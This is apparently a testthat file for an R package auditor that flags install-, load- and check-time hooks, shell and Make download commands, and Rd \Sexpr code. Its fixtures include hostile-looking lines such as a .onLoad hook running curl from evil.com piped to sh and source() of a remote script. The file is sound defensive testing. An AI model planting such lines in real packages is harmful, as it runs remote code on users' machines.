rules <- load_rules()

# structure --------------------------------------------------------------------
test_that("audit_package() returns a pkgaudit object of five frames plus metadata", {
  pkg <- make_pkg(files = list("R/zzz.R" = "invisible(NULL)"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_s3_class(res, "pkgaudit")
  expect_named(res, c("file_contexts", "code_contexts", "patterns",
                      "expressions", "errors", "metadata"))
  for (nm in c("file_contexts", "code_contexts", "patterns", "expressions",
               "errors")) {
    expect_s3_class(res[[nm]], "data.frame")
  }
  expect_type(res$metadata, "list")

  expect_named(res$file_contexts,
               c("rule", "file_context", "message", .phase_columns))
  expect_named(res$code_contexts,
               c("rule", "file_context", "line_number", "column_number",
                 "message", .phase_columns))
  expect_named(res$patterns,
               c("rule", "file_context", "line_number", "column_number",
                 "message", "attck", "code_context", .phase_columns))
  expect_named(res$expressions,
               c("rule", "file_context", "line_number", "column_number",
                 "message", "attck", .phase_columns))
  expect_named(res$errors, c("stage", "file_context", "rule", "message"))
})

test_that("audit_package() resolves the phases of every finding", {
  pkg <- make_pkg(files = list(
    "configure" = c("#!/bin/sh", "curl -s https://www.evil.test/x"),
    "R/zzz.R"   = c(".onLoad <- function(libname, pkgname) {",
                    "  system('id')", "}",
                    "helper <- function() system('id')")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # A file context takes its phases from the rule that matched it.
  configure <- res$file_contexts[res$file_contexts$rule == "configure", ]
  expect_true(configure$at_install_src)
  expect_true(configure$at_check)
  expect_false(configure$at_load)

  # A code context takes its phases from its own rule, so .onLoad() adds at_load
  # to the phases that install it.
  onload <- res$code_contexts[res$code_contexts$rule == "onLoad_base", ]
  expect_true(onload$at_load)
  expect_true(onload$at_install_src)

  # A pattern inherits the phases of the code context it sits in: the hook's
  # system() call runs at load, the one in an ordinary function runs never.
  hook <- res$patterns[res$patterns$code_context == "onLoad_base", ]
  expect_true(all(hook$at_load))

  uncalled <- res$patterns[res$patterns$code_context == "Other", ]
  expect_equal(nrow(uncalled), 1L)
  expect_false(any(unlist(uncalled[, .phase_columns])))

  # An expression inherits the phases of the file context it was found in, so
  # the curl in configure runs exactly when configure does.
  expr <- res$expressions[res$expressions$rule == "curl", ]
  expect_equal(nrow(expr), 1L)
  expect_equal(expr[, .phase_columns], configure[, .phase_columns],
               ignore_attr = TRUE)
})

test_that("audit_package() errors on a non-directory", {
  expect_error(audit_package(tempfile()), "dir.exists")
})

# integration ------------------------------------------------------------------
test_that("audit_package() finds file contexts, code contexts and patterns", {
  pkg <- make_pkg(files = list(
    "configure"          = "#!/bin/sh",
    "src/Makevars"       = "all:",
    "src/install.libs.R" = "system2('echo', 'x')",
    "R/zzz.R" = c(
      ".onLoad <- function(libname, pkgname) {",
      "  system('curl http://evil.com | sh')",
      "}",
      "source('http://evil.com/top.R')"
    )
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  expect_setequal(res$file_contexts$file_context,
                  c("configure", "src/Makevars", "src/install.libs.R"))
  expect_true("onLoad_base" %in% res$code_contexts$rule)

  # system() in the hook, source() at top level, system2() at top level of
  # install.libs.R -> the three code-context labels are attributed correctly.
  sys_hook <- res$patterns[res$patterns$rule == "system" &
                             res$patterns$file_context == "R/zzz.R", ]
  expect_equal(sys_hook$code_context, "onLoad_base")

  src_top <- res$patterns[res$patterns$rule == "source", ]
  expect_equal(src_top$code_context, "Top-level")

  installlibs <- res$patterns[res$patterns$file_context == "src/install.libs.R", ]
  expect_equal(installlibs$rule, "system")
  expect_equal(installlibs$code_context, "Top-level")

  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() reports relative-path parse errors and continues", {
  pkg <- make_pkg(files = list(
    "R/bad.R"  = ")invalid R syntax(",
    "R/good.R" = "system('id')"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$errors), 1L)
  expect_equal(res$errors$stage, "parse_code")
  expect_equal(res$errors$file_context, "R/bad.R")
  # The good file was still audited despite the bad one.
  expect_true("R/good.R" %in% res$patterns$file_context)
})

test_that("audit_package() on a package with no scannable content is empty", {
  pkg <- make_pkg()
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$file_contexts), 0L)
  expect_equal(nrow(res$code_contexts), 0L)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$expressions), 0L)
  expect_equal(nrow(res$errors), 0L)
})

# discovery and reporting ------------------------------------------------------
test_that("audit_package() scans R/ and man/ without reporting them", {
  pkg <- make_pkg(files = list(
    "configure" = "#!/bin/sh",
    "R/zzz.R"   = "system('id')",
    "man/f.Rd"  = c("\\name{f}", "\\title{T}", "\\examples{", "system('id')", "}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # Only the reporting rule contributes a finding, so the frame stays a list of
  # security-relevant files rather than an inventory of the package.
  expect_equal(res$file_contexts$file_context, "configure")
  # Both non-reporting files were nevertheless scanned.
  expect_setequal(res$patterns$file_context, c("R/zzz.R", "man/f.Rd"))
})

test_that("audit_package() scans the OS-specific R and man subdirectories", {
  pkg <- make_pkg(files = list(
    "R/unix/u.R"      = "system('unix')",
    "R/windows/w.R"   = "system('windows')",
    "man/unix/u.Rd"   = c("\\name{u}", "\\title{U}", "\\examples{", "system('mu')", "}"),
    "man/windows/w.Rd" = c("\\name{w}", "\\title{W}", "\\examples{", "system('mw')", "}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_setequal(res$patterns$file_context,
                  c("R/unix/u.R", "R/windows/w.R",
                    "man/unix/u.Rd", "man/windows/w.Rd"))
})

# help files -------------------------------------------------------------------
test_that("audit_package() attributes help-file code to its two contexts", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}",                            # 1
    "\\title{T \\Sexpr{system('uname')}}",  # 2
    "\\description{d}",                     # 3
    "\\examples{",                          # 4
    "download.file('http://x', 'y')",       # 5
    "g <- function() system('never')",      # 6
    "}"                                     # 7
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  ctx <- stats::setNames(res$patterns$code_context, res$patterns$rule)

  expect_equal(unname(ctx[["download_file"]]), "Rd_examples")
  # A pattern inside a function definition in an example runs only if something
  # calls it, exactly as in a script, so it is Other rather than Rd_examples.
  expect_true("Other" %in% res$patterns$code_context)
  expect_true("Rd_Sexpr" %in% res$patterns$code_context)
  expect_equal(nrow(res$errors), 0L)
})

test_that("help-file findings carry the line they occupy in the .Rd", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{T \\Sexpr{system('uname')}}", "\\description{d}",
    "\\examples{", "download.file('http://x', 'y')", "}"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$patterns$line_number[res$patterns$rule == "system"], 2L)
  expect_equal(res$patterns$line_number[res$patterns$rule == "download_file"], 5L)
})

test_that("help-file findings take the phases their context runs in", {
  pkg <- make_pkg(files = list("man/f.Rd" = c(
    "\\name{f}", "\\title{T \\Sexpr{system('uname')}}", "\\description{d}",
    "\\examples{", "download.file('http://x', 'y')", "}"
  )))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  ex <- res$patterns[res$patterns$code_context == "Rd_examples", ]
  sx <- res$patterns[res$patterns$code_context == "Rd_Sexpr", ]

  # Examples run under R CMD check and nowhere else.
  expect_true(ex$at_check)
  expect_false(ex$at_build)
  expect_false(ex$at_install_src)

  # \Sexpr is evaluated whenever the page is rendered, but not for a binary.
  expect_true(sx$at_build)
  expect_true(sx$at_check)
  expect_true(sx$at_install_src)
  expect_false(sx$at_install_bin)
})

test_that("audit_package() expands Rd macros so hidden code is still found", {
  pkg <- make_pkg(files = list(
    "man/macros/m.Rd" = "\\newcommand{\\bang}{\\Sexpr{system(\"id\")}}",
    "man/f.Rd" = c("\\name{f}", "\\title{T}", "\\description{Uses \\bang{}.}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  # The code reaches the page through the macro, and is reported against the
  # page that uses it. man/macros/ is not scanned directly: a \newcommand body
  # parses as an opaque token, so there is nothing to find there.
  expect_equal(res$patterns$rule, "system")
  expect_equal(res$patterns$file_context, "man/f.Rd")
  expect_equal(res$patterns$code_context, "Rd_Sexpr")
  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() records an unparseable help file and continues", {
  pkg <- make_pkg(files = list(
    "man/bad.Rd"  = c("\\name{b}", "\\title{B}", "\\examples{", ")bad syntax(", "}"),
    "man/good.Rd" = c("\\name{g}", "\\title{G}", "\\examples{", "system('id')", "}")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$errors$stage, "parse_code")
  expect_equal(res$errors$file_context, "man/bad.Rd")
  expect_true("man/good.Rd" %in% res$patterns$file_context)
})

# expressions ------------------------------------------------------------------
test_that("audit_package() scans the shell and Make-like file contexts only", {
  pkg <- make_pkg(files = list(
    "configure"          = "curl -s https://www.evil.test/a",
    "src/Makevars"       = "all:\n\twget https://www.evil.test/b",
    "src/install.libs.R" = "# curl -s https://www.evil.test/c",
    "R/zzz.R"            = "# curl -s https://www.evil.test/d",
    "NEWS.md"            = "curl -s https://www.evil.test/e"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)

  # src/install.libs.R is a file context, but its type is R, so it is parsed
  # for patterns rather than matched for expressions. NEWS.md is no context.
  expect_setequal(res$expressions$file_context, c("configure", "src/Makevars"))
  expect_equal(res$expressions$rule[res$expressions$file_context == "configure"],
               "curl")
  expect_equal(res$expressions$rule[res$expressions$file_context == "src/Makevars"],
               "wget")
  expect_equal(nrow(res$errors), 0L)
})

test_that("audit_package() locates each expression in its file", {
  pkg <- make_pkg(files = list(
    "configure" = c("#!/bin/sh", "echo hi", "  curl -s https://www.evil.test/x")
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(res$expressions$line_number,   3L)
  expect_equal(res$expressions$column_number, 3L)
})

test_that("audit_package() finds no expressions when no file context is shell or make", {
  pkg <- make_pkg(files = list("R/zzz.R" = "system('curl https://www.evil.test/x')"))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  res <- audit_package(pkg, rules)
  expect_equal(nrow(res$expressions), 0L)
  expect_gt(nrow(res$patterns), 0L)
})

test_that("an expression's phases are the union of every rule that matched its file", {
  # No shipped pair of file-context rules matches the same path, so the union
  # is exercised directly on a frame where one does.
  fc <- .empty_file_contexts()
  fc[1L, ] <- c(list("configure", "configure", "m"),
                phase_values("at_build", "at_check", "at_install_src"))
  fc[2L, ] <- c(list("configure_ac", "configure", "m"),
                phase_values("at_autoconf"))

  ex <- .empty_expressions(with_phases = FALSE)
  ex[1L, ] <- list("curl", "configure", 1L, 1L, "m", "T1041")

  out <- .resolve_expression_phases(ex, fc)
  expect_true(all(unlist(out[, c("at_autoconf", "at_build", "at_check",
                                 "at_install_src")])))
  expect_false(any(unlist(out[, c("at_install_bin", "at_load", "at_attach",
                                  "at_unload", "at_detach")])))
})

test_that("an expression in a file with no file-context row runs in no phase", {
  ex <- .empty_expressions(with_phases = FALSE)
  ex[1L, ] <- list("curl", "configure", 1L, 1L, "m", "T1041")

  out <- .resolve_expression_phases(ex, .empty_file_contexts())
  expect_false(any(unlist(out[, .phase_columns])))
})

test_that("audit_package() reports a failing expression rule and continues", {
  pkg <- make_pkg(files = list(
    "configure"    = "curl -s https://www.evil.test/a",
    "src/Makevars" = "wget https://www.evil.test/b"
  ))
  on.exit(unlink(pkg, recursive = TRUE), add = TRUE)

  broken <- rules
  broken$regex <- rbind(
    data.frame(name = "broken", version = "0.1.0", message = "m",
               attck = "T1041", regex = "(unclosed", stringsAsFactors = FALSE),
    rules$regex
  )

  res <- audit_package(pkg, broken)
  # The failure is recorded once per file it was attempted in, and the sound
  # rules were still evaluated in both.
  expect_equal(unique(res$errors$stage), "find_regex")
  expect_equal(unique(res$errors$rule),  "broken")
  expect_setequal(res$errors$file_context, c("configure", "src/Makevars"))
  expect_setequal(res$expressions$rule, c("curl", "wget"))
})
